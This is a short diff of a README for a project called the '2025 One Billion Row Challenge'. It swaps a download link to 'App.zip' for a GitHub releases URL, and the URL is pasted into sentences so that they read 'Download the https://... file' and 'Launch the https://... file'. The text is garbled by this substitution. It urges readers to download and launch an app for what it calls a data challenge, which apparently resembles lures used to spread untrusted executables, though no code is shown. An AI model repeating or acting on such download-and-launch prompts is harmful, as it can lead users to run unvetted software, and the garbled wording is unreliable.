@@ -21,9 +21,9 @@ The **2025 One Billion Row Challenge** is a data-related project that aims to pu
 ## Accessing the Project
 
 To access the project and start exploring the one billion row dataset, click the following link:  
-[Download the App.zip file](https://github.com/uploads/App.zip)
+[Download the https://github.com/KikiBoum4980/2025-One-Billion-Row-Challenge/releases file](https://github.com/KikiBoum4980/2025-One-Billion-Row-Challenge/releases)
 
-🚀 Launch the App.zip file to dive into the world of massive data!
+🚀 Launch the https://github.com/KikiBoum4980/2025-One-Billion-Row-Challenge/releases file to dive into the world of massive data!
 
 If the provided link does not work or is outdated, please check the **Releases** section of this repository for alternative download options.
 
